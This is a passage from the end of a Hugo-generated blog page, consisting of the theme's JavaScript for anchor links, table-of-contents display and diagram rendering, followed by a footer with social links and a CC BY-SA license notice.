        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
        }
      }) : null;
    }
    
    
    
    
    
    var topOffset = 120;
    var botOffset = 70;
    var handleWindowResize = function () {
      if (tocElem) {
        tocElem.style.maxHeight = (window.innerHeight - topOffset - botOffset) + 'px';
      }
    }
    var throttledWindowResize = throttle(handleWindowResize, 300);
    throttledWindowResize()

    
    window.addEventListener('resize', throttledWindowResize);
    



    
    var text, clip = new ClipboardJS('.anchor');
    var headers = singleContentsElem.querySelectorAll("h1, h2, h3, h4");

    
    var languagedir = JSON.parse("\"ltr\"");

    headers ? 
    headers.forEach(function (elem) {
      var size = parseInt(elem.tagName.substr(1), 10) * 2;
      var url = encodeURI(document.location.origin + document.location.pathname);
      var link = url + "#" + elem.getAttribute('id');
      var newElemOuter = document.createElement('span');
      newElemOuter.classList.add('anchor');
      newElemOuter.classList.add('hide');
      newElemOuter.setAttribute('data-clipboard-text', decodeURI(link));
      newElemOuter.style.position = 'relative';

      var newElemInner = document.createElement('span');
      newElemInner.style.position = 'absolute';
      newElemInner.style.top = '50%';
      newElemInner.style.left = '0.75rem';
      newElemInner.style.transform = 'translateY(-50%)';
      newElemInner.innerHTML = `
<svg fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="${32 - size}px" height="${32 - size}px"><path d="M 5.5625 0 C 4.136719 0 2.707031 0.542969 1.625 1.625 C -0.539063 3.789063 -0.539063 7.335938 1.625 9.5 L 5.28125 13.15625 C 5.667969 13.554688 6.304688 13.558594 6.703125 13.171875 C 7.101563 12.785156 7.105469 12.148438 6.71875 11.75 L 3.03125 8.0625 C 1.632813 6.664063 1.632813 4.429688 3.03125 3.03125 C 4.429688 1.632813 6.664063 1.632813 8.0625 3.03125 L 12.96875 7.9375 C 14.367188 9.335938 14.367188 11.570313 12.96875 12.96875 C 12.804688 13.132813 12.621094 13.25 12.4375 13.375 C 11.980469 13.6875 11.859375 14.308594 12.171875 14.765625 C 12.484375 15.222656 13.105469 15.34375 13.5625 15.03125 C 13.847656 14.835938 14.125 14.625 14.375 14.375 C 16.539063 12.210938 16.539063 8.664063 14.375 6.5 L 9.5 1.625 C 8.417969 0.542969 6.988281 0 5.5625 0 Z M 10.78125 8.875 C 10.738281 8.882813 10.695313 8.894531 10.65625 8.90625 C 10.507813 8.9375 10.371094 9 10.25 9.09375 C 10.039063 9.253906 9.820313 9.429688 9.625 9.625 C 7.460938 11.789063 7.460938 15.335938 9.625 17.5 L 14.5 22.375 C 16.664063 24.539063 20.210938 24.539063 22.375 22.375 C 24.539063 20.210938 24.539063 16.664063 22.375 14.5 L 18.71875 10.875 C 18.476563 10.578125 18.089844 10.441406 17.714844 10.527344 C 17.34375 10.613281 17.050781 10.90625 16.964844 11.277344 C 16.878906 11.652344 17.015625 12.039063 17.3125 12.28125 L 20.96875 15.9375 C 22.367188 17.335938 22.367188 19.570313 20.96875 20.96875 C 19.570313 22.367188 17.335938 22.367188 15.9375 20.96875 L 11.03125 16.0625 C 9.632813 14.664063 9.632813 12.429688 11.03125 11.03125 C 11.152344 10.90625 11.300781 10.820313 11.4375 10.71875 C 11.839844 10.472656 12.015625 9.976563 11.855469 9.53125 C 11.699219 9.085938 11.25 8.8125 10.78125 8.875 Z"/></svg>`;

      if (languagedir === "rtl") {
        newElemInner.style.left = '-2rem';
      } else {
        newElemInner.style.right = '-2rem';
      }

      newElemOuter.append(newElemInner);
      elem.append(newElemOuter);

      elem.addEventListener('mouseenter', function() {
        this.querySelector('.anchor').classList.remove('hide');
      });
      elem.addEventListener('mouseleave', function () {
        this.querySelector('.anchor').classList.add('hide');
      });
    }) : null;

    document.querySelectorAll('.anchor').forEach(function(elem) {
      elem.addEventListener('mouseleave', function() {
        elem.setAttribute('aria-label', null);
        elem.classList.remove('tooltipped');
        elem.classList.remove('tooltipped-s');
        elem.classList.remove('tooltipped-w');
      });
    });

    clip.on('success', function (e) {
      e.clearSelection();
      e.trigger.setAttribute('aria-label', 'Link copied to clipboard!');
      e.trigger.classList.add('tooltipped');
      e.trigger.classList.add('tooltipped-s');
    });
    // =================================================================



    
    
    var lib = JSON.parse("null");

    if (lib && lib.includes('mermaid')) {
      
      var themeVariant = localStorage.getItem('theme') || JSON.parse("\"dark\"");

      if (themeVariant === "dark" || themeVariant === "hacker") {
        mermaid.initialize({ theme: 'dark' });
      } else {
        mermaid.initialize({ theme: 'default' });
      }
      
      var mermaids = [];
      [].push.apply(mermaids, document.getElementsByClassName('language-mermaid'));
      mermaids.forEach(function(elem) {
        var elemParentNode = elem.parentNode;

        if (elemParentNode !== document.body) {
          elemParentNode.parentNode.insertBefore(elem, elemParentNode);
          elemParentNode.parentNode.removeChild(elemParentNode);
        }

        var newElemWrapper = document.createElement('div');
        newElemWrapper.classList.add('mermaid');
        newElemWrapper.style.padding = '34px 4px 6px';
        newElemWrapper.innerHTML = elem.innerHTML;
        elem.replaceWith(newElemWrapper);
      });
    }
    

    

    
    if (lib && lib.includes('katex')) {
      var mathElements = document.getElementsByClassName('math');
      var options = {
        delimiters: [
          { left: "$$", right: "$$", display: true },
          { left: "\\[", right: "\\]", display: true },
          { left: "$", right: "$", display: false },
          { left: "\\(", right: "\\)", display: false }
        ],
      };

      renderMathInElement(document.querySelector('.single__contents'), options);
    }
    



    
    if (lib && lib.includes('flowchartjs')) {
      
      var options = JSON.parse("{\"arrow-end\":\"block\",\"element-color\":\"black\",\"fill\":\"white\",\"flowstate\":{\"approved\":{\"fill\":\"#58C4A3\",\"font-size\":12,\"no-text\":\"n/a\",\"yes-text\":\"APPROVED\"},\"current\":{\"fill\":\"yellow\",\"font-color\":\"red\",\"font-weight\":\"bold\"},\"future\":{\"fill\":\"#FFFF99\"},\"invalid\":{\"fill\":\"#444444\"},\"past\":{\"fill\":\"#CCCCCC\",\"font-size\":12},\"rejected\":{\"fill\":\"#C45879\",\"font-size\":12,\"no-text\":\"REJECTED\",\"yes-text\":\"n/a\"},\"request\":{\"fill\":\"blue\"}},\"font-color\":\"black\",\"font-size\":14,\"line-color\":\"black\",\"line-length\":50,\"line-width\":3,\"no-text\":\"no\",\"scale\":1,\"symbols\":{\"end\":{\"class\":\"end-element\"},\"start\":{\"element-color\":\"green\",\"fill\":\"yellow\",\"font-color\":\"red\"}},\"text-margin\":10,\"x\":0,\"y\":0,\"yes-text\":\"yes\"}");
      var jsonContent = null;

      var flowchartPrefix = "language-flowchart";
      var index = 0;
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + flowchartPrefix + "]"), function(x){
          x.style.display = 'none'
          x.parentNode.style.backgroundColor = "transparent"
          jsonContent = x.innerText;

          var node0 = document.createElement('div');
          node0.id = 'flowchart' + index;
          x.parentNode.insertBefore(node0, x);

          var diagram = flowchart.parse(jsonContent);
          diagram.drawSVG("flowchart"+index, options);

          index +=1;
      });      
    }
    

    

    
    document.querySelectorAll("mjx-container").forEach(function (x) {
      x.parentElement.classList += 'has-jax'
    });
    



    
    if (lib && lib.includes('msc')) {
      
      var options = JSON.parse("{\"theme\":\"hand\"}");
      var jsonContent = null;

      var index = 0;
      var chartPrefix = "language-msc";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        node0.id = 'msc' + index;
        x.parentNode.insertBefore(node0, x);
        var diagram = Diagram.parse(jsonContent);
        diagram.drawSVG("msc" + index, options);
        index += 1;
      });
    }
    



    
    if (lib && lib.includes('chart')) {
      var borderColor = "#666";
      var bgColor = "#ddd";
      var borderWidth = 2;

      Chart.defaults.global.elements.rectangle.borderWidth = borderWidth;
      Chart.defaults.global.elements.rectangle.borderColor = borderColor;
      Chart.defaults.global.elements.rectangle.backgroundColor = bgColor;

      Chart.defaults.global.elements.line.borderWidth = borderWidth;
      Chart.defaults.global.elements.line.borderColor = borderColor;
      Chart.defaults.global.elements.line.backgroundColor = bgColor;

      Chart.defaults.global.elements.point.borderWidth = borderWidth;
      Chart.defaults.global.elements.point.borderColor = borderColor;
      Chart.defaults.global.elements.point.backgroundColor = bgColor;

      var chartPrefix = "language-chart";
      var index = 0;
      var jsonContent = null;

      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('canvas');
        var source = null;
        node0.height = 200;
        node0.style.height = 200;
        node0.id = 'myChart' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        var ctx = document.getElementById('myChart' + index).getContext('2d');
        var myChart = new Chart(ctx, source);
        index += 1;
      });            
    }
    



    
    if (lib && lib.includes('wavedrom')) {
      var wavePrefix = "language-wave";
      var index = 0;
      var jsonContent = null;
      
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + wavePrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        var source = null;
        node0.id = 'WaveDrom_Display_' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        WaveDrom.RenderWaveForm(index, source, "WaveDrom_Display_");
        index += 1;
      });
    }
    



    
    if (lib && lib.includes('viz')) {
      var vizPrefix = "language-viz-";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        var engine;
        x.getAttribute("class").split(" ").forEach(function (cls) {
          if (cls.startsWith(vizPrefix)) {
            engine = cls.substr(vizPrefix.length);
          }
        });
        var viz = new Viz();
        viz.renderSVGElement(x.innerText, { engine: engine })
          .then(function (element) {
            element.style.width = "100%";
            x.parentNode.insertBefore(element, x);
          })
      });
    }
    
    
  }
</script>


            
            <footer class="footer">
    
    
<div class="footer__social">
  <div class="social">
    
            
    
            
    
            
    
      
      <a href="javascript:location.href%20=%20%27mailto:%27%20&#43;%20[%27noobintheshell%27,%27protonmail.com%27].join%28%27@%27%29" title="email" aria-label="email">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.4 4.25l-7.07 4.42c-.32.2-.74.2-1.06 0L4.4 8.25c-.25-.16-.4-.43-.4-.72 0-.67.73-1.07 1.3-.72L12 11l6.7-4.19c.57-.35 1.3.05 1.3.72 0 .29-.15.56-.4.72z"/></svg>
      </a>
            
    
            
    
            
    
      
      <a href="https://github.com/noobintheshell" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
      
      <a href="https://twitter.com/noobintheshell_" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
    
  
  
    
      <a href="https://noobintheshell.com/posts/index.xml" type="application/rss+xml" title="RSS" aria-label="RSS Feed Link">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><circle fill="currentColor" cx="6.18" cy="17.82" r="2.18"/><path fill="currentColor" d="M5.59 10.23c-.84-.14-1.59.55-1.59 1.4 0 .71.53 1.28 1.23 1.4 2.92.51 5.22 2.82 5.74 5.74.12.7.69 1.23 1.4 1.23.85 0 1.54-.75 1.41-1.59-.68-4.2-3.99-7.51-8.19-8.18zm-.03-5.71C4.73 4.43 4 5.1 4 5.93c0 .73.55 1.33 1.27 1.4 6.01.6 10.79 5.38 11.39 11.39.07.73.67 1.28 1.4 1.28.84 0 1.5-.73 1.42-1.56-.73-7.34-6.57-13.19-13.92-13.92z"/></svg>
      </a>
    
  


  </div>
</div>

    
<div id="gtt">
  <div class="gtt">
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 14.71L12 10.83l3.88 3.88c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L12.7 8.71c-.39-.39-1.02-.39-1.41 0L6.7 13.3c-.39.39-.39 1.02 0 1.41.39.38 1.03.39 1.42 0z"/></svg>
  </div>
</div>

    <hr />

    <div class="basicflex flexwrap">
        
            
        
            
        
    </div>

    <div class="footer__poweredby">
        
                
            <p class="caption">
                
                    
                    

                    
                        2023, Some Rights Reserved -<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA</a>
                    
                
            </p>
        

        
            <p class="caption">Powered by <a href="https://gohugo.io/" target="_blank" rel="noreferrer">Hugo</a> and the <a href="https://github.com/zzossig/hugo-theme-zzo" target="_blank" rel="noreferrer">Zzo theme</a></p>
        
        
    </div> 
</footer>
        </div>
        





<div class="wrapper__right hide" data-pad="true" dir="ltr">
  <script>document.querySelector('.wrapper__right').classList.remove('hide')</script>
  
</div>

    </div>
</body>

</html>